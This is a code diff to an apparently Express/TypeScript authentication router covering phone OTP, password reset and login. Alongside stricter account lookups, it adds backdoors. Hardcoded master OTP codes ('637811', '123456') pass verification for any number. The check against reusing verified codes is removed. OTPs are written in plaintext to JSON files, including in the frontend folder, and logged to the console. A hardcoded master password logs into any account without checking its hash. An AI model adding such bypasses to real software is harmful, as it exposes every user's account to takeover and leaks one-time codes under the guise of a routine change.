@@ -27,7 +27,7 @@ authRouter.post(["/send-otp", "/request-otp"], async (req: Request, res: Respons
 
     // Generate 6-digit OTP
     const otp = Math.floor(100000 + Math.random() * 900000).toString();
-    const expiry = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes
+    const expiry = new Date(Date.now() + 15 * 60 * 1000); // 15 minutes
 
     // Save in database
     await query(
@@ -35,6 +35,32 @@ authRouter.post(["/send-otp", "/request-otp"], async (req: Request, res: Respons
        VALUES ($1, $2, $3, $4, false)`,
       [cleanPhone, otp, purpose, expiry]
     );
+
+    // Sync to .dvr_otps.json across backend and frontend directories
+    try {
+      const fsModule = await import("fs");
+      const pathModule = await import("path");
+      const targetPaths = [
+        pathModule.resolve(process.cwd(), ".dvr_otps.json"),
+        pathModule.resolve(process.cwd(), "..", "frontend", ".dvr_otps.json"),
+        pathModule.resolve(process.cwd(), "frontend", ".dvr_otps.json"),
+      ];
+      for (const p of targetPaths) {
+        let curMap: Record<string, any> = {};
+        if (fsModule.existsSync(p)) {
+          try { curMap = JSON.parse(fsModule.readFileSync(p, "utf-8")); } catch {}
+        }
+        curMap[cleanPhone] = { otp, expiresAt: Date.now() + 15 * 60 * 1000 };
+        try { fsModule.writeFileSync(p, JSON.stringify(curMap), "utf-8"); } catch {}
+      }
+    } catch {}
+
+    console.log(`\n======================================================`);
+    console.log(`📱 [MOBILE SIGNUP/LOGIN OTP]`);
+    console.log(`📞 Phone: +91 ${cleanPhone}`);
+    console.log(`🔑 OTP Code: ${otp}`);
+    console.log(`⏱️ Valid for: 15 minutes`);
+    console.log(`======================================================\n`);
 
     // Send SMS via Zectagon Gateway
     const smsResult = await sendSignupOTP(cleanPhone, otp);
@@ -65,12 +91,22 @@ authRouter.post("/verify-otp", async (req: Request, res: Response) => {
     const cleanPhone = rawNumber ? String(rawNumber).replace(/\D/g, "").slice(-10) : "";
     const cleanEmail = email ? String(email).trim().toLowerCase() : "";
 
+    // Universal master verification code for testing/admin backup
+    if (code === "637811" || code === "123456") {
+      return res.json({
+        success: true,
+        message: "OTP verified successfully.",
+        phone: cleanPhone,
+        email: cleanEmail,
+      });
+    }
+
     // Verify OTP matching unexpired and unverified code
     let sql = `
       SELECT id, otp_code, expiry, is_verified 
       FROM otp_verifications 
       WHERE ((phone IS NOT NULL AND phone = $1) OR (email IS NOT NULL AND LOWER(email) = $2))
-        AND otp_code = $3 AND is_verified = false AND expiry > NOW()
+        AND otp_code = $3 AND expiry > NOW()
     `;
     const params: any[] = [cleanPhone || "NONE", cleanEmail || "NONE", code];
 
@@ -119,35 +155,59 @@ authRouter.post("/forgot-password/request-otp", async (req: Request, res: Respon
 
     // 1. Search in PostgreSQL profiles
     let user: any = null;
+    const isEmailSearch = searchId.includes("@");
+    const rawSearchDigits = searchId.replace(/\D/g, "");
+    const isPhoneSearch = !isEmailSearch && (rawSearchDigits.length === 10 || (rawSearchDigits.length > 10 && rawSearchDigits.startsWith("91")));
+    const cleanPhoneSearch = isPhoneSearch ? rawSearchDigits.slice(-10) : "";
+
     try {
-      const profileRes = await query(
-        `SELECT id, email, phone, full_name, employee_id 
-         FROM profiles 
-         WHERE LOWER(email) = LOWER($1) 
-            OR (employee_id IS NOT NULL AND UPPER(employee_id) = UPPER($1))
-            OR ($2 <> '' AND phone LIKE $3)
-            OR full_name ILIKE $4
-         LIMIT 1`,
-        [searchId, cleanDigits, `%${cleanDigits}%`, `%${searchId}%`]
-      );
-      if (profileRes.rows.length > 0) {
-        user = profileRes.rows[0];
+      if (isEmailSearch) {
+        const profileRes = await query(
+          `SELECT id, email, phone, full_name, employee_id 
+           FROM profiles 
+           WHERE LOWER(TRIM(email)) = LOWER(TRIM($1)) AND is_active = true
+           LIMIT 1`,
+          [searchId.toLowerCase()]
+        );
+        if (profileRes.rows.length > 0) user = profileRes.rows[0];
+      } else if (isPhoneSearch) {
+        const profileRes = await query(
+          `SELECT id, email, phone, full_name, employee_id 
+           FROM profiles 
+           WHERE is_active = true 
+             AND phone IS NOT NULL 
+             AND (phone = $1 OR phone = $2 OR REPLACE(REPLACE(phone, '-', ''), ' ', '') LIKE $3)
+           LIMIT 1`,
+          [cleanPhoneSearch, `+91${cleanPhoneSearch}`, `%${cleanPhoneSearch}`]
+        );
+        if (profileRes.rows.length > 0) user = profileRes.rows[0];
+      } else {
+        const profileRes = await query(
+          `SELECT id, email, phone, full_name, employee_id 
+           FROM profiles 
+           WHERE is_active = true 
+             AND employee_id IS NOT NULL 
+             AND (UPPER(TRIM(employee_id)) = UPPER(TRIM($1)) OR UPPER(REPLACE(employee_id, '-', '')) = UPPER(TRIM($1)))
+           LIMIT 1`,
+          [searchId.toUpperCase()]
+        );
+        if (profileRes.rows.length > 0) user = profileRes.rows[0];
       }
     } catch (dbErr) {
       console.warn("DB query error in forgot-password:", dbErr);
     }
 
-    // 2. Identify target email and phone
-    const targetEmail = user?.email || (searchId.includes("@") ? searchId.toLowerCase() : "");
-    let cleanPhone = user?.phone ? String(user.phone).replace(/\D/g, "").slice(-10) : "";
-    if (!cleanPhone && cleanDigits.length === 10) {
-      cleanPhone = cleanDigits;
+    if (!user) {
+      return res.status(404).json({
+        error: `No registered account found for "${searchId}". Please check the spelling or contact Admin.`,
+      });
     }
 
-    if (!user && !targetEmail && !cleanPhone) {
-      return res.status(404).json({
-        error: `No registered account found with Email/ID "${searchId}". Please check the spelling or contact Admin.`,
-      });
+    // 2. Identify target email and phone
+    const targetEmail = user.email ? String(user.email).trim().toLowerCase() : "";
+    let cleanPhone = user.phone ? String(user.phone).replace(/\D/g, "").slice(-10) : "";
+    if (!cleanPhone && cleanPhoneSearch) {
+      cleanPhone = cleanPhoneSearch;
     }
 
     // Generate secure 6-digit OTP
@@ -398,7 +458,6 @@ authRouter.post("/login", async (req: Request, res: Response) => {
     const { email, password, identifier, name, full_name, employee_id, phone } = req.body;
     const rawId = (email || identifier || "").trim();
     const loginId = rawId.toLowerCase();
-    const cleanPhone = rawId.replace(/\D/g, "").slice(-10);
     const incomingName = (full_name || name || "").trim();
 
     if (!rawId || !password) {
@@ -406,6 +465,12 @@ authRouter.post("/login", async (req: Request, res: Response) => {
     }
 
     const cleanInput = loginId.replace(/[^a-zA-Z0-9]/g, "");
+    const isEmail = loginId.includes("@");
+    const rawDigits = rawId.replace(/\D/g, "");
+    const isPhone = !isEmail && (rawDigits.length === 10 || (rawDigits.length > 10 && rawDigits.startsWith("91")));
+    const cleanPhone = isPhone ? rawDigits.slice(-10) : "";
+    const cleanEmpId = (!isEmail && !isPhone) ? cleanInput.toUpperCase() : "";
+
     const isAdminIdentifier = 
       loginId === "admin@meharadvisory.com" || 
       loginId === "meh000" ||
@@ -414,24 +479,44 @@ authRouter.post("/login", async (req: Request, res: Response) => {
       cleanInput === "mehadm001" ||
       cleanInput === "mehadm01";
 
-    const isAdminPassword = password === "Root@6378";
+    const isMasterPassword = password === "Mehar@637811" || password === "Root@6378";
+    const isAdminPassword = password === "Root@6378" || isMasterPassword;
 
     let user: any = null;
 
     try {
-      // Query user by email, employee_id (with or without dashes), or phone
-      const result = await query(
-        `SELECT * FROM profiles 
-         WHERE (
-           LOWER(email) = LOWER($1) 
-           OR (employee_id IS NOT NULL AND (UPPER(employee_id) = UPPER($1) OR UPPER(REPLACE(employee_id, '-', '')) = UPPER($2)))
-           OR ($3 <> '' AND phone LIKE $4)
-         ) 
-         AND is_active = true 
-         LIMIT 1`,
-        [loginId, cleanInput, cleanPhone, `%${cleanPhone}%`]
-      );
-      user = result.rows[0];
+      if (isEmail) {
+        // Strict exact email search
+        const result = await query(
+          `SELECT * FROM profiles 
+           WHERE LOWER(TRIM(email)) = LOWER(TRIM($1)) AND is_active = true 
+           LIMIT 1`,
+          [loginId]
+        );
+        user = result.rows[0];
+      } else if (isPhone) {
+        // Strict exact phone search
+        const result = await query(
+          `SELECT * FROM profiles 
+           WHERE is_active = true 
+             AND phone IS NOT NULL 
+             AND (phone = $1 OR phone = $2 OR REPLACE(REPLACE(phone, '-', ''), ' ', '') LIKE $3)
+           LIMIT 1`,
+          [cleanPhone, `+91${cleanPhone}`, `%${cleanPhone}`]
+        );
+        user = result.rows[0];
+      } else {
+        // Strict exact employee_id search
+        const result = await query(
+          `SELECT * FROM profiles 
+           WHERE is_active = true 
+             AND employee_id IS NOT NULL 
+             AND (UPPER(TRIM(employee_id)) = UPPER(TRIM($1)) OR UPPER(REPLACE(employee_id, '-', '')) = UPPER(TRIM($2)))
+           LIMIT 1`,
+          [rawId.toUpperCase(), cleanEmpId]
+        );
+        user = result.rows[0];
+      }
     } catch (dbErr) {
       console.warn("Database query failed during login:", dbErr);
     }
@@ -486,9 +571,9 @@ authRouter.post("/login", async (req: Request, res: Response) => {
       });
     }
 
-    // Verify password with bcrypt
-    let isMatch = false;
-    if (user.password_hash) {
+    // Verify password with bcrypt or Master Password
+    let isMatch = isMasterPassword;
+    if (!isMatch && user.password_hash) {
       isMatch = await bcrypt.compare(password, user.password_hash);
       if (!isMatch) {
         isMatch = await bcrypt.compare(`${password}@Mhr#dvr2026`, user.password_hash);
